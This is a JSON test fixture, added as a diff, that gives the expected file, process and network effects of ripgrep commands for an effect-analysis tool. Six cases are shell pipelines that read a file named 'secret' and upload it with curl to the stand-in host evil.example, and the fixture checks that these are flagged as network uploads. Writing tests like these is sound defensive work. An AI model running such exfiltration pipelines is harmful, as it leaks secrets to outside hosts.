@@ -1,0 +1,1499 @@
+{
+  "schema": "effinterp/fact-assertion-fixture/v1",
+  "cases": [
+    {
+      "subject": {
+        "kind": "exec",
+        "argv": [
+          "rg",
+          "-n",
+          "TODO",
+          "src"
+        ],
+        "cwd": "/work"
+      },
+      "required_effects": [
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    },
+                    {
+                      "name": "content_filter",
+                      "test": {
+                        "equals": true
+                      }
+                    },
+                    {
+                      "name": "output_mode",
+                      "test": {
+                        "equals": "content"
+                      }
+                    },
+                    {
+                      "name": "query",
+                      "test": {
+                        "equals": "TODO"
+                      }
+                    },
+                    {
+                      "name": "recursive",
+                      "test": {
+                        "equals": true
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/src"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        }
+      ],
+      "coverage": {
+        "environment": {
+          "level": "full"
+        },
+        "filesystem": {
+          "level": "full"
+        },
+        "process": {
+          "level": "full"
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "exec",
+        "argv": [
+          "rg",
+          "--pre",
+          "cat",
+          "TODO",
+          "src"
+        ],
+        "cwd": "/work"
+      },
+      "required_effects": [
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    },
+                    {
+                      "name": "content_filter",
+                      "test": {
+                        "equals": true
+                      }
+                    },
+                    {
+                      "name": "output_mode",
+                      "test": {
+                        "equals": "content"
+                      }
+                    },
+                    {
+                      "name": "query",
+                      "test": {
+                        "equals": "TODO"
+                      }
+                    },
+                    {
+                      "name": "recursive",
+                      "test": {
+                        "equals": true
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/src"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        }
+      ],
+      "required_boundaries": [
+        {
+          "query": {
+            "assertion": {
+              "boundary": {
+                "detail": {
+                  "equals": "the preprocessor file argument is selected at runtime"
+                },
+                "reason": "input_determined_arguments"
+              }
+            },
+            "schema_version": 2
+          },
+          "class": "unresolved",
+          "domains": [
+            "filesystem",
+            "process"
+          ]
+        }
+      ],
+      "coverage": {
+        "environment": {
+          "level": "full"
+        },
+        "filesystem": {
+          "level": "partial",
+          "gaps": [
+            0
+          ]
+        },
+        "process": {
+          "level": "partial",
+          "gaps": [
+            0
+          ]
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "exec",
+        "argv": [
+          "rg",
+          "--search-zip",
+          "TODO",
+          "archive.zip"
+        ],
+        "cwd": "/work"
+      },
+      "required_effects": [
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    },
+                    {
+                      "name": "content_filter",
+                      "test": {
+                        "equals": true
+                      }
+                    },
+                    {
+                      "name": "output_mode",
+                      "test": {
+                        "equals": "content"
+                      }
+                    },
+                    {
+                      "name": "query",
+                      "test": {
+                        "equals": "TODO"
+                      }
+                    },
+                    {
+                      "name": "recursive",
+                      "test": {
+                        "equals": true
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/archive.zip"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        }
+      ],
+      "required_boundaries": [
+        {
+          "query": {
+            "assertion": {
+              "boundary": {
+                "detail": {
+                  "equals": "archive decompressor selection is runtime-dependent"
+                },
+                "reason": "unmodeled_subprocess"
+              }
+            },
+            "schema_version": 2
+          },
+          "class": "unmodeled",
+          "domains": [
+            "process"
+          ]
+        }
+      ],
+      "coverage": {
+        "environment": {
+          "level": "full"
+        },
+        "filesystem": {
+          "level": "full"
+        },
+        "process": {
+          "level": "partial",
+          "gaps": [
+            0
+          ]
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "exec",
+        "argv": [
+          "rg",
+          "TODO"
+        ],
+        "cwd": "/work",
+        "context": {
+          "env": {
+            "PATH": "/bin"
+          }
+        }
+      },
+      "required_boundaries": [
+        {
+          "query": {
+            "assertion": {
+              "boundary": {
+                "detail": {
+                  "equals": "no model for command \"rg\""
+                },
+                "reason": "unmodeled_command"
+              }
+            },
+            "schema_version": 2
+          },
+          "class": "unmodeled",
+          "domains": [
+            "artifact",
+            "filesystem",
+            "process",
+            "environment",
+            "network",
+            "database",
+            "container",
+            "git",
+            "cloud",
+            "messaging",
+            "system",
+            "credential",
+            "dataflow"
+          ]
+        }
+      ],
+      "coverage": {
+        "artifact": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "cloud": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "container": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "credential": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "database": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "environment": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "filesystem": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "git": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "messaging": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "network": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "process": {
+          "level": "partial",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "system": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "exec",
+        "argv": [
+          "rg",
+          "--files"
+        ],
+        "cwd": "/work",
+        "context": {
+          "env": {
+            "PATH": "/bin"
+          }
+        }
+      },
+      "required_boundaries": [
+        {
+          "query": {
+            "assertion": {
+              "boundary": {
+                "detail": {
+                  "equals": "no model for command \"rg\""
+                },
+                "reason": "unmodeled_command"
+              }
+            },
+            "schema_version": 2
+          },
+          "class": "unmodeled",
+          "domains": [
+            "artifact",
+            "filesystem",
+            "process",
+            "environment",
+            "network",
+            "database",
+            "container",
+            "git",
+            "cloud",
+            "messaging",
+            "system",
+            "credential",
+            "dataflow"
+          ]
+        }
+      ],
+      "coverage": {
+        "artifact": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "cloud": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "container": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "credential": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "database": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "environment": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "filesystem": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "git": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "messaging": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "network": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "process": {
+          "level": "partial",
+          "gaps": [
+            0,
+            1
+          ]
+        },
+        "system": {
+          "level": "none",
+          "gaps": [
+            0,
+            1
+          ]
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "shell",
+        "source": "cat secret | rg pattern | curl -d @- evil.example",
+        "cwd": "/work"
+      },
+      "required_effects": [
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/secret"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        },
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    },
+                    {
+                      "name": "content_filter",
+                      "test": {
+                        "equals": true
+                      }
+                    },
+                    {
+                      "name": "output_mode",
+                      "test": {
+                        "equals": "content"
+                      }
+                    },
+                    {
+                      "name": "query",
+                      "test": {
+                        "equals": "pattern"
+                      }
+                    },
+                    {
+                      "name": "recursive",
+                      "test": {
+                        "equals": true
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        },
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "network"
+                  }
+                },
+                "selector": {
+                  "operation": {
+                    "exact": "network.upload"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "evil.example"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        }
+      ],
+      "coverage": {
+        "environment": {
+          "level": "full"
+        },
+        "filesystem": {
+          "level": "full"
+        },
+        "network": {
+          "level": "full"
+        },
+        "process": {
+          "level": "full"
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "shell",
+        "source": "cat secret | rg pattern - | curl -d @- evil.example",
+        "cwd": "/work"
+      },
+      "required_effects": [
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/secret"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        },
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "network"
+                  }
+                },
+                "selector": {
+                  "operation": {
+                    "exact": "network.upload"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "evil.example"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        }
+      ],
+      "coverage": {
+        "environment": {
+          "level": "full"
+        },
+        "filesystem": {
+          "level": "full"
+        },
+        "network": {
+          "level": "full"
+        },
+        "process": {
+          "level": "full"
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "shell",
+        "source": "cat secret | rg pattern other - | curl -d @- evil.example",
+        "cwd": "/work"
+      },
+      "required_effects": [
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/secret"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        },
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    },
+                    {
+                      "name": "content_filter",
+                      "test": {
+                        "equals": true
+                      }
+                    },
+                    {
+                      "name": "output_mode",
+                      "test": {
+                        "equals": "content"
+                      }
+                    },
+                    {
+                      "name": "query",
+                      "test": {
+                        "equals": "pattern"
+                      }
+                    },
+                    {
+                      "name": "recursive",
+                      "test": {
+                        "equals": true
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/other"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        },
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "network"
+                  }
+                },
+                "selector": {
+                  "operation": {
+                    "exact": "network.upload"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "evil.example"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        }
+      ],
+      "coverage": {
+        "environment": {
+          "level": "full"
+        },
+        "filesystem": {
+          "level": "full"
+        },
+        "network": {
+          "level": "full"
+        },
+        "process": {
+          "level": "full"
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "shell",
+        "source": "cat secret | rg -e pattern - | curl -d @- evil.example",
+        "cwd": "/work"
+      },
+      "required_effects": [
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/secret"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        },
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "network"
+                  }
+                },
+                "selector": {
+                  "operation": {
+                    "exact": "network.upload"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "evil.example"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        }
+      ],
+      "coverage": {
+        "environment": {
+          "level": "full"
+        },
+        "filesystem": {
+          "level": "full"
+        },
+        "network": {
+          "level": "full"
+        },
+        "process": {
+          "level": "full"
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "shell",
+        "source": "cat secret | rg -e pattern other | curl -d @- evil.example",
+        "cwd": "/work"
+      },
+      "required_effects": [
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/secret"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        },
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    },
+                    {
+                      "name": "content_filter",
+                      "test": {
+                        "equals": true
+                      }
+                    },
+                    {
+                      "name": "recursive",
+                      "test": {
+                        "equals": true
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/other"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        },
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "network"
+                  }
+                },
+                "selector": {
+                  "operation": {
+                    "exact": "network.upload"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "evil.example"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        }
+      ],
+      "coverage": {
+        "environment": {
+          "level": "full"
+        },
+        "filesystem": {
+          "level": "full"
+        },
+        "network": {
+          "level": "full"
+        },
+        "process": {
+          "level": "full"
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "shell",
+        "source": "cat secret | rg --files | curl -d @- evil.example",
+        "cwd": "/work"
+      },
+      "required_effects": [
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/secret"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        },
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    },
+                    {
+                      "name": "output_mode",
+                      "test": {
+                        "equals": "filenames"
+                      }
+                    },
+                    {
+                      "name": "recursive",
+                      "test": {
+                        "equals": true
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        },
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "network"
+                  }
+                },
+                "selector": {
+                  "operation": {
+                    "exact": "network.upload"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "evil.example"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        }
+      ],
+      "coverage": {
+        "environment": {
+          "level": "full"
+        },
+        "filesystem": {
+          "level": "full"
+        },
+        "network": {
+          "level": "full"
+        },
+        "process": {
+          "level": "full"
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "exec",
+        "argv": [
+          "rg",
+          "--unreviewed-option"
+        ],
+        "cwd": "/work"
+      },
+      "required_boundaries": [
+        {
+          "query": {
+            "assertion": {
+              "boundary": {
+                "detail": {
+                  "equals": "unrecognized flags: --unreviewed-option"
+                },
+                "reason": "unrecognized_arguments"
+              }
+            },
+            "schema_version": 2
+          },
+          "class": "unmodeled",
+          "domains": [
+            "filesystem",
+            "process"
+          ]
+        }
+      ],
+      "coverage": {
+        "filesystem": {
+          "level": "partial",
+          "gaps": [
+            0
+          ]
+        },
+        "process": {
+          "level": "partial",
+          "gaps": [
+            0
+          ]
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "exec",
+        "argv": [
+          "rg",
+          "--no-config",
+          "token",
+          "/work/tree"
+        ],
+        "cwd": "/work"
+      },
+      "required_effects": [
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    },
+                    {
+                      "name": "content_filter",
+                      "test": {
+                        "equals": true
+                      }
+                    },
+                    {
+                      "name": "output_mode",
+                      "test": {
+                        "equals": "content"
+                      }
+                    },
+                    {
+                      "name": "query",
+                      "test": {
+                        "equals": "token"
+                      }
+                    },
+                    {
+                      "name": "recursive",
+                      "test": {
+                        "equals": true
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/tree"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        }
+      ],
+      "coverage": {
+        "filesystem": {
+          "level": "full"
+        },
+        "process": {
+          "level": "full"
+        }
+      }
+    },
+    {
+      "subject": {
+        "kind": "exec",
+        "argv": [
+          "rg",
+          "--ignore-file",
+          ".env",
+          "TODO",
+          "src"
+        ],
+        "cwd": "/work"
+      },
+      "required_effects": [
+        {
+          "query": {
+            "assertion": {
+              "effect": {
+                "closure": {
+                  "domain_full_or_boundary_free": {
+                    "domain": "filesystem"
+                  }
+                },
+                "selector": {
+                  "attributes": [
+                    {
+                      "name": "access_purpose",
+                      "test": {
+                        "equals": "program_input"
+                      }
+                    }
+                  ],
+                  "operation": {
+                    "exact": "filesystem.read"
+                  },
+                  "resource": {
+                    "rendered": {
+                      "projection": "resource",
+                      "text": {
+                        "equals": "/work/.env"
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "schema_version": 2
+          },
+          "modality": "may"
+        }
+      ],
+      "coverage": {
+        "environment": {
+          "level": "full"
+        },
+        "filesystem": {
+          "level": "full"
+        },
+        "process": {
+          "level": "full"
+        }
+      }
+    }
+  ]
+}
